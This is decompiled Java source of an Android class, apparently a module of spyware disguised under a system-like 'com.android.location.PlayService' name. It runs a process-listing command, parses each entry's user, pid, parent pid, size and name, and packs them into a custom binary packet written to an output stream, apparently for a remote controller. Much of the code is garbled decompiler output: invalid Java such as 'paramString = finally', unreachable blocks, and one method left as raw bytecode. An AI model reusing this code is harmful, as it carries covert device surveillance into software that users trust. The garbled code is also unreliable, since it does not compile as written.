package ru.mobile.protector;

import com.android.location.PlayService;
import java.io.IOException;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.Iterator;

public class ProcessRT
{
  private static final byte END_OF_BLOCK = 2;
  private static final byte END_OF_FIELD = 1;
  private static final byte END_OF_LINE = 3;
  private static final byte PSLIST_PACKET = 96;
  
  public ProcessRT() {}
  
  private static void AddData(OutputStream paramOutputStream, String paramString)
  {
    if (paramOutputStream == null) {
      return;
    }
    String str = paramString;
    if (paramString == null) {
      str = "";
    }
    if (str != null) {}
    try
    {
      paramOutputStream.write(str.getBytes());
      try
      {
        paramOutputStream.write(1);
        return;
      }
      catch (Exception paramOutputStream)
      {
        return;
      }
      try
      {
        paramOutputStream.write(1);
        throw paramString;
      }
      catch (Exception paramOutputStream)
      {
        for (;;) {}
      }
    }
    catch (Exception paramString)
    {
      paramString = paramString;
      try
      {
        paramOutputStream.write(1);
        return;
      }
      catch (Exception paramOutputStream) {}
    }
    finally
    {
      paramString = finally;
    }
  }
  
  private static void FLOG(String paramString)
  {
    PlayService.FLO(paramString);
  }
  
  public static void Read(OutputStream paramOutputStream)
  {
    Object localObject = commandPS();
    if (localObject != null) {
      try
      {
        localObject = getProcessData((String[])localObject);
        paramOutputStream.write(96);
        localObject = ((ArrayList)localObject).iterator();
        for (;;)
        {
          if (!((Iterator)localObject).hasNext())
          {
            paramOutputStream.write(2);
            return;
          }
          ProcessData localProcessData = (ProcessData)((Iterator)localObject).next();
          AddData(paramOutputStream, localProcessData.pid);
          AddData(paramOutputStream, localProcessData.ppid);
          AddData(paramOutputStream, localProcessData.readTime);
          AddData(paramOutputStream, localProcessData.vzise);
          AddData(paramOutputStream, localProcessData.user.trim());
          AddData(paramOutputStream, localProcessData.name.trim());
          paramOutputStream.write(3);
        }
        FLOG("procList = null");
      }
      catch (IOException paramOutputStream)
      {
        PlayService.EXCEPT(paramOutputStream, "exc: " + paramOutputStream.toString());
        return;
      }
    }
  }
  
  /* Error */
  private static String[] commandPS()
  {
    // Byte code:
    //   0: aconst_null
    //   1: checkcast 130	[Ljava/lang/String;
    //   4: astore 6
    //   6: invokestatic 136	java/lang/Runtime:getRuntime	()Ljava/lang/Runtime;
    //   9: astore_3
    //   10: aconst_null
    //   11: astore 4
    //   13: aconst_null
    //   14: astore 5
    //   16: aconst_null
    //   17: astore 7
    //   19: aload 5
    //   21: astore_2
    //   22: aload_3
    //   23: ldc -118
    //   25: invokevirtual 142	java/lang/Runtime:exec	(Ljava/lang/String;)Ljava/lang/Process;
    //   28: astore_3
    //   29: aload_3
    //   30: astore 4
    //   32: aload 5
    //   34: astore_2
    //   35: new 144	java/io/OutputStreamWriter
    //   38: dup
    //   39: aload_3
    //   40: invokevirtual 150	java/lang/Process:getOutputStream	()Ljava/io/OutputStream;
    //   43: invokespecial 152	java/io/OutputStreamWriter:<init>	(Ljava/io/OutputStream;)V
    //   46: astore 5
    //   48: aload 5
    //   50: ldc -102
    //   52: invokevirtual 156	java/io/OutputStreamWriter:write	(Ljava/lang/String;)V
    //   55: aload 5
    //   57: invokevirtual 159	java/io/OutputStreamWriter:flush	()V
    //   60: aload 5
    //   62: invokevirtual 162	java/io/OutputStreamWriter:close	()V
    //   65: aload 5
    //   67: ifnull +232 -> 299
    //   70: aload 5
    //   72: invokevirtual 162	java/io/OutputStreamWriter:close	()V
    //   75: aload_3
    //   76: astore_2
    //   77: new 164	java/io/BufferedReader
    //   80: dup
    //   81: new 166	java/io/InputStreamReader
    //   84: dup
    //   85: aload_2
    //   86: invokevirtual 170	java/lang/Process:getInputStream	()Ljava/io/InputStream;
    //   89: invokespecial 173	java/io/InputStreamReader:<init>	(Ljava/io/InputStream;)V
    //   92: invokespecial 176	java/io/BufferedReader:<init>	(Ljava/io/Reader;)V
    //   95: astore_3
    //   96: new 104	java/lang/StringBuilder
    //   99: dup
    //   100: invokespecial 177	java/lang/StringBuilder:<init>	()V
    //   103: astore 4
    //   105: aload_3
    //   106: invokevirtual 180	java/io/BufferedReader:readLine	()Ljava/lang/String;
    //   109: astore 5
    //   111: aload 5
    //   113: ifnonnull +96 -> 209
    //   116: aload 4
    //   118: invokevirtual 116	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   121: ldc -74
    //   123: invokevirtual 186	java/lang/String:split	(Ljava/lang/String;)[Ljava/lang/String;
    //   126: astore_3
    //   127: aload_2
    //   128: ifnull +22 -> 150
    //   131: bipush 30
    //   133: istore_0
    //   134: iload_0
    //   135: iconst_1
    //   136: isub
    //   137: istore_1
    //   138: iload_0
    //   139: ifgt +110 -> 249
    //   142: iload_1
    //   143: ifgt +7 -> 150
    //   146: aload_2
    //   147: invokevirtual 189	java/lang/Process:destroy	()V
    //   150: aload_3
    //   151: areturn
    //   152: astore 5
    //   154: aload 4
    //   156: astore_3
    //   157: aload 7
    //   159: astore 4
    //   161: aload 4
    //   163: astore_2
    //   164: aload 5
    //   166: invokevirtual 192	java/io/IOException:printStackTrace	()V
    //   169: aload_3
    //   170: astore_2
    //   171: aload 4
    //   173: ifnull -96 -> 77
    //   176: aload 4
    //   178: invokevirtual 162	java/io/OutputStreamWriter:close	()V
    //   181: aload_3
    //   182: astore_2
    //   183: goto -106 -> 77
    //   186: astore_2
    //   187: aload_3
    //   188: astore_2
    //   189: goto -112 -> 77
    //   192: astore_3
    //   193: aload_2
    //   194: ifnull +7 -> 201
    //   197: aload_2
    //   198: invokevirtual 162	java/io/OutputStreamWriter:close	()V
    //   201: aload_3
    //   202: athrow
    //   203: astore_2
    //   204: aload_3
    //   205: astore_2
    //   206: goto -129 -> 77
    //   209: aload 4
    //   211: new 104	java/lang/StringBuilder
    //   214: dup
    //   215: aload 5
    //   217: invokestatic 196	java/lang/String:valueOf	(Ljava/lang/Object;)Ljava/lang/String;
    //   220: invokespecial 108	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   223: ldc -58
    //   225: invokevirtual 115	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   228: invokevirtual 116	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   231: invokevirtual 115	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   234: pop
    //   235: goto -130 -> 105
    //   238: astore_3
    //   239: aload_3
    //   240: invokevirtual 192	java/io/IOException:printStackTrace	()V
    //   243: aload 6
    //   245: astore_3
    //   246: goto -119 -> 127
    //   249: aload_2
    //   250: invokevirtual 202	java/lang/Process:exitValue	()I
    //   253: pop
    //   254: goto -112 -> 142
    //   257: astore 4
    //   259: ldc2_w 203
    //   262: invokestatic 210	java/lang/Thread:sleep	(J)V
    //   265: iload_1
    //   266: istore_0
    //   267: goto -133 -> 134
    //   270: astore_2
    //   271: aload_2
    //   272: invokevirtual 211	java/lang/InterruptedException:printStackTrace	()V
    //   275: aload_3
    //   276: areturn
    //   277: astore_2
    //   278: goto -77 -> 201
    //   281: astore_3
    //   282: aload 5
    //   284: astore_2
    //   285: goto -92 -> 193
    //   288: astore_2
    //   289: aload 5
    //   291: astore 4
    //   293: aload_2
    //   294: astore 5
    //   296: goto -135 -> 161
    //   299: aload_3
    //   300: astore_2
    //   301: goto -224 -> 77
    // Local variable table:
    //   start	length	slot	name	signature
    //   133	134	0	i	int
    //   137	129	1	j	int
    //   21	162	2	localObject1	Object
    //   186	1	2	localIOException1	IOException
    //   188	10	2	localObject2	Object
    //   203	1	2	localIOException2	IOException
    //   205	45	2	localObject3	Object
    //   270	2	2	localInterruptedException	InterruptedException
    //   277	1	2	localIOException3	IOException
    //   284	1	2	localIOException4	IOException
    //   288	6	2	localIOException5	IOException
    //   300	1	2	localObject4	Object
    //   9	179	3	localObject5	Object
    //   192	13	3	localObject6	Object
    //   238	2	3	localIOException6	IOException
    //   245	31	3	arrayOfString1	String[]
    //   281	19	3	localObject7	Object
    //   11	199	4	localObject8	Object
    //   257	1	4	localIllegalThreadStateException	IllegalThreadStateException
    //   291	1	4	localObject9	Object
    //   14	98	5	localObject10	Object
    //   152	138	5	localIOException7	IOException
    //   294	1	5	localObject11	Object
    //   4	240	6	arrayOfString2	String[]
    //   17	141	7	localObject12	Object
    // Exception table:
    //   from	to	target	type
    //   22	29	152	java/io/IOException
    //   35	48	152	java/io/IOException
    //   176	181	186	java/io/IOException
    //   22	29	192	finally
    //   35	48	192	finally
    //   164	169	192	finally
    //   70	75	203	java/io/IOException
    //   77	105	238	java/io/IOException
    //   105	111	238	java/io/IOException
    //   116	127	238	java/io/IOException
    //   209	235	238	java/io/IOException
    //   249	254	257	java/lang/IllegalThreadStateException
    //   146	150	270	java/lang/InterruptedException
    //   249	254	270	java/lang/InterruptedException
    //   259	265	270	java/lang/InterruptedException
    //   197	201	277	java/io/IOException
    //   48	65	281	finally
    //   48	65	288	java/io/IOException
  }
  
  private static ArrayList<ProcessData> getProcessData(String[] paramArrayOfString)
  {
    ArrayList localArrayList = new ArrayList();
    String str = paramArrayOfString[(paramArrayOfString.length - 1)];
    int i = 1;
    for (;;)
    {
      if (i >= paramArrayOfString.length - 1) {
        return localArrayList;
      }
      String[] arrayOfString = paramArrayOfString[i].split("\\s+");
      ProcessData localProcessData = new ProcessData(null);
      localProcessData.user = arrayOfString[0];
      localProcessData.pid = arrayOfString[1];
      localProcessData.ppid = arrayOfString[2];
      localProcessData.vzise = arrayOfString[3];
      localProcessData.name = arrayOfString[8];
      localProcessData.readTime = str;
      localArrayList.add(localProcessData);
      i += 1;
    }
  }
  
  private static class ProcessData
  {
    String name;
    String pid;
    String ppid;
    String readTime;
    String user;
    String vzise;
    
    private ProcessData() {}
  }
}
